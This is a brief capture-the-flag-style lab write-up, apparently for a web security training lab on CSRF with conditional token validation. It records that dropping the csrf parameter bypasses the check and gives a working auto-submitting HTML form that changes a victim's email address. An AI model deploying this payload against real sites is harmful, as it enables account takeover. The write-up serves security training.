Lab #3 - CSRF where token validation depends on token being present

Vulnerability parameter - email change functionality

Goal - use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
creds - winer:peter

Analysis:
- when logged in, change email address of this account
- using BurpSuite, change csrf token => tell that: invalid csrf token
- delete csrf token parameter => successfully change the email address

Solution:
- create a HTML form to use CSRF attack, do not attach csrf token to this form
    <form method="POST" action="https://0a150068035794ea806f9462002400a8.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="a@evil-email.com">
    </form>

    <script>
        document.forms[0].submit();
    </script>
